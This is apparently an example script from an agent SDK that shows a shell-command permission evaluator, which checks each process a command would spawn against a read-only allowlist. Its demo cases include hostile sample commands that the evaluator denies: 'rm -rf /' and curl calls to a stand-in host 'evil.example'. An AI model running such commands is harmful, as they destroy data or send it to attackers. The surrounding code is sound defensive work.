#!/usr/bin/env python3
"""Example: per-spawn shell-command permission evaluator.

The ``Bash`` tool runs a full shell command, which may be compositional:
pipes, ``&&``/``||`` sequences, subshells, command substitution, and ``cd``
changing the working directory mid-command. Matching such a command with a
regex or a substring blocklist produces both false positives (a safe
``grep ... | awk '$1 > N'`` denied because it "looks" conditional) and false
negatives.

``create_bash_permission_evaluator`` builds a ``can_use_tool`` callback that
instead decomposes the command into the individual processes it would spawn,
tracks the working directory across the command, and evaluates each spawn
against a per-binary safety function you supply. Anything it cannot prove safe
to decompose is denied (fail-safe).

The evaluator is opt-in: it only runs when the
``CLAUDE_AGENT_SDK_SHELL_PERMISSIONS`` environment variable is truthy. Run:

    CLAUDE_AGENT_SDK_SHELL_PERMISSIONS=1 python examples/shell_permission_evaluator.py

Requires the optional extra:  pip install "claude-agent-sdk[shell-permissions]"
"""

import asyncio

from claude_agent_sdk import (
    ClaudeAgentOptions,
    ClaudeSDKClient,
    PermissionResultDeny,
    ToolPermissionContext,
    create_bash_permission_evaluator,
    evaluate,
)


# A per-binary safety function returns True if this invocation is safe to
# auto-approve, given its argv and effective working directory. These examples
# are illustrative: they permit a handful of read-only inspection tools.
def _read_only(argv: list[str], cwd: str) -> bool:
    return True


POLICY = {
    "grep": _read_only,
    "awk": _read_only,
    "ls": _read_only,
    "cat": _read_only,
    "head": _read_only,
    "tail": _read_only,
    "wc": _read_only,
}


# Anything the evaluator does not approve falls through to this callback, so you
# keep full control over the deny path (prompt a human, log, escalate, ...).
async def fallback(
    tool_name: str,
    input_data: dict,
    context: ToolPermissionContext,
) -> PermissionResultDeny:
    return PermissionResultDeny(
        message="Command not on the read-only allowlist; blocked by policy."
    )


def offline_demo() -> None:
    """Show decisions without launching Claude, for a quick local sanity check."""
    cases = [
        "grep -n foo file.txt | awk '$1 > 700 && $1 < 2540'",  # allowed
        "cd /var/log && tail -n 100 syslog",  # allowed (cwd tracked)
        "rm -rf /",  # denied (rm not in policy)
        "cat secrets && curl http://evil.example",  # denied (curl not in policy)
        "cat <(curl http://evil.example)",  # denied (process substitution)
    ]
    for command in cases:
        result = evaluate(command, policy=POLICY)
        verdict = "ALLOW" if result.allowed else "DENY "
        print(f"{verdict} | {command}")
        if not result.allowed:
            print(f"        reason: {result.reason}")


async def live_demo() -> None:
    can_use_tool = create_bash_permission_evaluator(policy=POLICY, fallback=fallback)
    options = ClaudeAgentOptions(
        allowed_tools=["Bash"],
        can_use_tool=can_use_tool,
    )
    async with ClaudeSDKClient(options=options) as client:
        await client.query("Count the lines in README.md using a shell command.")
        async for message in client.receive_response():
            print(message)


if __name__ == "__main__":
    print("Offline decision demo:\n")
    offline_demo()
    # Uncomment to drive a real session (requires the Claude Code CLI):
    # asyncio.run(live_demo())
